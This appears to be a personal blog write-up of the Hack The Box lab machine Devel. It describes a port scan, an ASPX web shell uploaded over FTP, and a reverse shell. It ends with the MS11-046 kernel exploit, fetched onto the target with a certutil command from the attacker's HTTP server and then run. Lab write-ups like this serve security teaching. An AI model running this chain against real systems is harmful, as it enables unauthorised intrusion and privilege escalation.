---
title: Devel (Hack The Box Writeup)
date: 2021-09-08T13:53:00+08:00
draft: false
url: "/2021/09/08/devel-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/3
- IP : `10.129.208.183`

## Information Gathering

- Port Scan`rustscan -a 10.129.208.183 -r 1-65535`
- 21 : FTP
- 80 : Web

## FTP Services

- Try to connect to ftp![](/uploads/2022/02/c395d-NlEyGJA.png)Use Aspx Web shell- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
- ![](/uploads/2022/02/d1764-kQiXZnv.png)

## Web Shell

- ![](/uploads/2022/02/39c7e-lTQfQ5B.png)
- Install Reverse ShellASPX Reverse shell
- https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

## Reverse shell

- ![](/uploads/2022/02/eae34-QUwHk42.png)
- Check System Info![](/uploads/2022/02/94660-X0rmprC.png)user : `iis apppool\web`![](/uploads/2022/02/c87ff-MVFpkLO.png)- System : Win 7 x64 6.1.7600 N/A Build 7600![](/uploads/2022/02/8c5ae-8coNqal.png)- Check Environment Variable

## Privilege Escalation

- With OS Version![](/uploads/2022/02/a4011-9jBTj6Z.png)Exploit : MS11-046 Kernel Exploits- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046Download Exploit file to target machine- `certutil -urlcache -f http://10.10.16.35:8000/ms11-046.exe ms11-046.exe`![](/uploads/2022/02/df580-lTEY1uw.png)Run binary- ![](/uploads/2022/02/ca2e3-QnsjTtY.png)
- Get SystemUser Flag- ![](/uploads/2022/02/4714e-WVxjMQC.png)Root Flag- ![](/uploads/2022/02/db68e-chjisN8.png)
